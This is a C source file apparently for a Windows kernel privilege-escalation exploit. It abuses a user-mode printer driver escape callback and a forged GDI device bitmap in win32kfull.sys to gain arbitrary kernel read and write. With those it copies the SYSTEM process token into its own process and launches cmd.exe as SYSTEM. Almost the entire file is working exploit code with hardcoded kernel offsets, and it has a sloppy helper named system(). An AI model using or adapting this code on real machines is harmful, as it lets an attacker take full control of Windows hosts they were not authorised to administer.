#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <winternl.h>
#include <winddi.h>

#include "umpd.h"
#include "nt.h"

#define PRINTER_NAME L"Microsoft XPS Document Writer"
#define INIT() LoadLibraryA("user32.dll")

#define OBJ_SET_QWORD(obj, offset, value) *(ULONG64*)( (PBYTE)(obj) + offset ) = (ULONG64)(value)
#define OBJ_GET_QWORD(obj, offset) *(ULONG64*)( (PBYTE)(obj) + offset )
#define OBJ_SET_DWORD(obj, offset, value) *(ULONG32*)( (PBYTE)(obj) + offset ) = (ULONG32)(value)
#define FAKE_OBJ_SET_VTABLE(obj, offset, value) *(ULONG64*)( (PBYTE)( *(ULONG64*)( (PBYTE)(obj) + 0 ) ) + offset ) = (ULONG64)(value)
#define OBJ_LEA(obj, offset) (PVOID)( (PBYTE)(obj) + offset ) 

typedef HBITMAP (NTAPI* FuncTy_NtGdiEngCreateDeviceBitmap) (
    DHSURF  dhsurf,
    tagSIZE sizl,
    FLONG fl
);

typedef BOOL (NTAPI* FuncTy_NtGdiEngStretchBltROP)(
    SURFOBJ         *psoDest,
    SURFOBJ         *psoSrc,
    SURFOBJ         *psoMask,
    CLIPOBJ         *pco,
    XLATEOBJ        *pxlo,
    COLORADJUSTMENT *pca,
    POINTL          *pptlHTOrg,
    RECTL           *prclDest,
    RECTL           *prclSrc,
    POINTL          *pptlMask,
    ULONG            iMode,
    BRUSHOBJ        *pbo,
    DWORD            rop4
);

FuncTy_NtGdiEngCreateDeviceBitmap   NtGdiEngCreateDeviceBitmap = NULL;
FuncTy_NtGdiEngStretchBltROP        NtGdiEngStretchBltROP = NULL;


HDC     g_hdc = NULL;
My_UMSO g_UmsoDest;
My_UMSO g_UmsoSrc;

PVOID g_pFakeObj = NULL;

PVOID g_kFn = NULL;

const CHAR   const_kernel_name[] = "win32kfull.sys";
const UINT64 const_rva_Fn = 0x2c9740; // rva of vSrcCopyS16D16Identity

int system()
{
    SECURITY_ATTRIBUTES     sa;
    HANDLE                  hRead, hWrite;
    byte                    buf[40960] = { 0 };
    STARTUPINFOW            si;
    PROCESS_INFORMATION     pi;
    DWORD                   bytesRead;
    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&sa, sizeof(sa));
    int br = 0;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        printf("[!][system] CreatePipe(): Failed with %llx\n", GetLastError());
        return -3;
    }

    si.cb = sizeof(STARTUPINFO);
    GetStartupInfoW(&si);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.lpDesktop = L"WinSta0\\Default";
    wchar_t cmd[4096] = { L"cmd.exe" };

    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        printf("[!][system] CreateProcessW(): Failed with %llx\n", GetLastError());
        return -2;
    }
    CloseHandle(hWrite);

}

BOOL init_kernel_addresses() {

    ptr_My_SYSTEM_MODULE_INFORMATION lpInfo = NULL;
    if (GetModulesInfo(&lpInfo) < 0) {
        return FALSE;
    }

    for (int i = 0; i < lpInfo->ModulesCount; i++) {
        ptr_My_SYSTEM_MODULE lpModule = &lpInfo->Modules[i];

        if (!strcmp(&lpModule->Name[lpModule->NameOffset], const_kernel_name)) {
            g_kFn = (PVOID)((UINT64)(lpModule->ImageBaseAddress) + const_rva_Fn);
            return TRUE;
        }
    };
    
    return FALSE;
};

PVOID init_fake_obj() {
    
    PBYTE lpFakeObj = (PBYTE)VirtualAlloc(NULL, 0x4000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    memset(lpFakeObj, 0xCC, 0x1000);
    

    OBJ_SET_QWORD(lpFakeObj, 0xB8, NULL); // disable EngAcquireSemaphore
    OBJ_SET_QWORD(lpFakeObj, 0x00, OBJ_LEA(lpFakeObj, 0x1000) ); // set vtable points to our start of fake object

    OBJ_SET_DWORD(lpFakeObj, 0x80, 0xCC | 0x21); // allow CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK 
                                                      // to call function from vtable CddBitmapHw::SyncDXAccessInternal
    OBJ_SET_QWORD(lpFakeObj, 0x28, NULL);

    return lpFakeObj;
}

BOOL init() {
    if (!init_kernel_addresses())
        return FALSE;

    HWND HelperWindow = CreateWindowEx(WS_EX_TOOLWINDOW, L"BUTTON", NULL,
                              WS_VISIBLE | WS_POPUP | WS_BORDER | WS_DISABLED,
                              0, 0, 50, 50, NULL, NULL, GetModuleHandle(0), NULL);
    HDC HelperWindowDCScr = GetWindowDC(HelperWindow); // That screen related HBITMAP allow us reach cdd module 
    FillMemory(&g_UmsoDest, sizeof(g_UmsoDest), 0);
    g_UmsoDest.hsurf = (HBITMAP)GetCurrentObject(HelperWindowDCScr, OBJ_BITMAP);
    g_UmsoDest.magic = 0x554D534F;

    g_pFakeObj = init_fake_obj();
    FAKE_OBJ_SET_VTABLE(g_pFakeObj, 0xB0, g_kFn);

    FillMemory(&g_UmsoSrc, sizeof(My_UMSO), 0);
    g_UmsoSrc.hsurf = (HBITMAP)NtGdiEngCreateDeviceBitmap((DHSURF)g_pFakeObj, {100, 100}, BMF_1BPP);;
    g_UmsoSrc.magic = 0x554D534F;

    wprintf(L"[?][init] g_kReadFn     = %p\n", g_kFn);
    wprintf(L"[?][init] g_pFakeObj    = %p\n", g_pFakeObj);
    wprintf(L"[?][init] hScreenBitmap = %x\n", g_UmsoDest.hsurf);
    wprintf(L"[?][init] hBitmap       = %x\n", g_UmsoSrc.hsurf);
    
    return TRUE;
}

VOID memmove(PVOID dst, PVOID src, SIZE_T size) {
    
    OBJ_SET_QWORD(g_pFakeObj, 0x08, src);
    OBJ_SET_QWORD(g_pFakeObj, 0x10, dst);
    OBJ_SET_DWORD(g_pFakeObj, 0x1C, size / 2); // x2

    OBJ_SET_DWORD(g_pFakeObj, 0x30, 0x00);
    OBJ_SET_DWORD(g_pFakeObj, 0x38, 0x00);

    OBJ_SET_DWORD(g_pFakeObj, 0x40, 0x00); // if ( *(_DWORD *)(a1 + 0x40) )
    OBJ_SET_DWORD(g_pFakeObj, 0x18, 0x00); // disable if ( *(int *)(a1 + 0x18) < 0 )

    OBJ_SET_DWORD(g_pFakeObj, 0x20, 0x01); // if ( !--v3 )
                                                //  break;

    RECTL rclDest;
    RECTL rclSrc;

    rclDest.left   = 0;
    rclDest.top    = 0;
    rclDest.right  = 10;
    rclDest.bottom = 10;

    rclSrc.left    = 0;
    rclSrc.top     = 0;
    rclSrc.right   = 20;
    rclSrc.bottom  = 20;

    POINTL pSrc = {2, 3};

    NtGdiEngStretchBltROP(
        &g_UmsoDest.so, &g_UmsoSrc.so, NULL, NULL, NULL, NULL, NULL,
        &rclDest, &rclSrc, NULL, COLORONCOLOR, NULL, 0xCCCC
    );

    OBJ_SET_DWORD(g_pFakeObj, 0x80, 0x21); // after complete CDDMULTIBITMAPLOCK::CDDMULTIBITMAPLOCK flag will be flushed
                                           // recover it
};

PVOID Read_64(PVOID address) {
    
    memmove(OBJ_LEA(g_pFakeObj, 0x2000), address, 8);

    return (PVOID)OBJ_GET_QWORD(g_pFakeObj, 0x2000);
};

VOID Write_64(PVOID address, ULONG64 value) {
    OBJ_SET_QWORD(g_pFakeObj, 0x2000, value);
    
    memmove(address, OBJ_LEA(g_pFakeObj, 0x2000), 8);
};

PVOID Read_kThread() {
    return Read_64(OBJ_LEA(g_pFakeObj, 0x210));
};

INT umpd_cb_escape(VOID *inputBuf, ULONGLONG inputBufSize, VOID *outputBuffer, ULONGLONG outputBufSize) {
    wprintf(L"[?][umpd_cb_escape][tid=%x]: STARTED \n", GetCurrentThreadId());

    PVOID kThread = Read_kThread();
    wprintf(L"[?][umpd_cb_escape][tid=%x]: kThread = %p\n", GetCurrentThreadId(), kThread);

    PVOID kProcess = Read_64(OBJ_LEA(kThread, 0x220));
    wprintf(L"[?][umpd_cb_escape][tid=%x]: kProcess = %p\n", GetCurrentThreadId(), kProcess);

    PVOID kActiveLinks = Read_64(OBJ_LEA(kProcess, 0x448));
    wprintf(L"[?][umpd_cb_escape][tid=%x]: kActiveLinks = %p\n", GetCurrentThreadId(), kActiveLinks);
    
    PVOID kP = kActiveLinks;
    do {
        kP = Read_64(OBJ_LEA(kP, 0x08));
        
        ULONG64 pid = (ULONG64)Read_64(OBJ_LEA(kP, -0x08));
        
        if (pid == 4) {
            PVOID kSystemToken = Read_64(OBJ_LEA(kP, 0x70));
          
            wprintf(L"[?][umpd_cb_escape][tid=%x]: kSystemToken=%p\n", GetCurrentThreadId(), kSystemToken);
            
            Write_64(OBJ_LEA(kProcess, 0x4b8), (ULONG64)kSystemToken);

            wprintf(L"[?][umpd_cb_escape][tid=%x]: Token stolen\n", GetCurrentThreadId());
            break;
        }
    } while (kP != kProcess);

    wprintf(L"[?][umpd_cb_escape][tid=%x]: COMPLETED \n", GetCurrentThreadId());
    
    return TRUE;
};

int
__cdecl
wmain(
    int argc,
    __in_ecount(argc) wchar_t* argv[])
{ 
    INIT();

    wprintf(L"[?][main] PID=%x\n", GetCurrentProcessId());
    wprintf(L"[?][main] TID=%x\n", GetCurrentThreadId());
    system("pause");

    NtGdiEngCreateDeviceBitmap = (FuncTy_NtGdiEngCreateDeviceBitmap)GetProcAddress(
        LoadLibraryW(L"win32u.dll"), "NtGdiEngCreateDeviceBitmap"
    );
    NtGdiEngStretchBltROP = (FuncTy_NtGdiEngStretchBltROP)GetProcAddress(
        LoadLibraryW(L"win32u.dll"), "NtGdiEngStretchBltROP"
    );

    HANDLE  hPrinter       = NULL;
    LPWSTR  driverFilepath = NULL;
    HMODULE driverDLL      = NULL; 

    if (!umpd_load_printer_dll(PRINTER_NAME, hPrinter, driverFilepath, driverDLL)) {
        wprintf(L"[~][main] Failed to load printer driver\n");
        return -1;
    }
    
    wprintf(L"[?][main] hPrinter       = %llx\n", (ULONGLONG)hPrinter);
    wprintf(L"[?][main] PrinterName    = %s\n", PRINTER_NAME);
    wprintf(L"[?][main] UMPD_Driver    = %s\n", driverFilepath);
    wprintf(L"[?][main] UMPD_DriverDLL = %llx\n", (ULONGLONG)driverDLL);

    if (!umpd_set_gdi_hooks()) {
        wprintf(L"[~][main] Failed to set gdi hook\n");
        return -2;
    }

    umpd_set_cb(INDEX_DrvEscape, umpd_cb_escape);

    init();

    g_hdc = CreateDC(PRINTER_NAME, PRINTER_NAME, NULL, NULL);

    system();

    return 0;
}